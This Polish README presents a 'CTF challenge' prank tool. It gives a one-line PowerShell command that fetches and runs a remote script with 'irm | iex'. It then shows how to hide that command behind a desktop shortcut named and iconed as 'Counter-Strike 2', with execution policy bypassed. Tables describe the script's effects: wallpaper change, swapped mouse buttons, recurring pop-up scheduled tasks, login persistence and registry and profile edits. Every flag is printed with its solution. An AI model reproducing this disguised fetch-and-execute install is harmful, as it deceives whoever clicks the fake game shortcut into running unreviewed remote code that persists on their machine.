# CTF Challenge — Ultimate Edition

## Instalacja (jedna komenda PowerShell):

```powershell
irm https://raw.githubusercontent.com/santobinoofficial/images/claude/powershell-virus-concept-run5U/ctf_challenge.ps1 | iex
```

## Jak zrobić skrót "CS2" na pulpicie:

1. PPM na pulpicie → **Nowy → Skrót**
2. Lokalizacja:
   ```
   powershell.exe -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/santobinoofficial/images/claude/powershell-virus-concept-run5U/ctf_challenge.ps1 | iex"
   ```
3. Nazwa: `Counter-Strike 2`
4. PPM → **Właściwości → Zmień ikonę** → wklej ścieżkę do ikony CS2

---

## Poziomy trudności

### [1] Easy
| Co | Efekt |
|----|-------|
| Tapeta | Rick Astley |
| Prompt | `[CTF] C:\Users\...` |
| Scheduled task | Co 1h — 1 okno |
| Flaga | Podzielona na 2 części w rejestrze (plaintext) |

**Flaga:** `CTF{easy_w4rm_up}`
**Jak znaleźć:** `(Get-ItemProperty HKCU:\Software\CTFChallenge)` → FlagPart1 + FlagPart2

---

### [2] Medium
Wszystko z Easy, plus:
| Co | Efekt |
|----|-------|
| Mysz | Przyciski odwrócone (lewy=prawy) |
| Scheduled task | Co 30 min — 3 okna naraz |
| Flaga | Base64, 2 miejsca: rejestr + plik AppData |

**Flaga:** `CTF{m3d1Um_ch4ll3ng3}`
**Jak znaleźć:**
```powershell
$a = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\CTFChallenge).DataA))
$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content "$env:APPDATA\Microsoft\.ctfdata")))
"$a$b"
```

---

### [3] Hard
Wszystko z Medium, plus:
| Co | Efekt |
|----|-------|
| Startup | Pojawia się przy każdym logowaniu |
| Scheduled task | Co 15 min — 5 okien naraz |
| Flaga | ROT13, 3 odłamki w 3 różnych miejscach |

**Flaga:** `CTF{h4rd_m0d3_m4st3r}`
**Jak znaleźć:**
```powershell
$s1 = (Get-ItemProperty HKCU:\Software\CTFChallenge).Cipher1
$s2 = Get-Content "$env:TEMP\ctf_h4rd.log"
$s3 = Get-Content "$env:APPDATA\Microsoft\WindowsApps\.ctf_sys"
ConvertFrom-Rot13 "$s1$s2$s3"  # funkcja dostępna po załadowaniu ctf_functions.ps1
```

---

### [4] TryHackMe
Brak zmian systemowych. Tworzy fałszywe środowisko VM z prawdziwym śledztwem:

**Scenariusz:** Serwer `srv-prod-01` został skompromitowany. Zbadaj ślady.

| Komenda | Co robi |
|---------|---------|
| `Start-CTFInvestigation` | Uruchamia Q&A (6 pytań) |
| `vm-ls /path` | Listuje katalog |
| `vm-cat /path/file` | Wyświetla plik |
| `vm-grep "wzorzec" /plik` | Szuka w pliku |
| `vm-find / -Name "*.txt"` | Szuka plików |
| `vm-ps` | Lista procesów |
| `vm-netstat` | Połączenia sieciowe |

**Flaga:** `CTF{thr34t_hunt3r}`

---

## Dwa zakończenia

### Zakończenie normalne (wygrana):
```powershell
Submit-CTFFlag "CTF{...}"     # Easy/Medium/Hard
Start-CTFInvestigation         # TryHackMe (odpowiedz na 6 pytań)
```
→ Ekran wygranej + czas rozwiązania + **pełne przywrócenie systemu**

### Zakończenie wczesne (wstyd):
```powershell
Remove-CTFChallenge
```
→ Ekran wstydu + ujawnienie gdzie była flaga + **pełne przywrócenie systemu**

### Zła flaga:
```powershell
Submit-CTFFlag "CTF{wrong}"
# [-] Zla flaga. Sprobuj jeszcze raz!
# [?] Podpowiedz: ...
# (nic nie usuwa)
```

---

## Co zostaje przywrócone po zakończeniu:
- Tapeta → oryginalna
- Przyciski myszy → oryginalna konfiguracja
- Scheduled tasks → usunięte
- Wpis startowy → usunięty (Hard)
- PowerShell profile → wyczyszczony
- Rejestr → usunięty
- Fake VM → usunięta (TryHackMe)
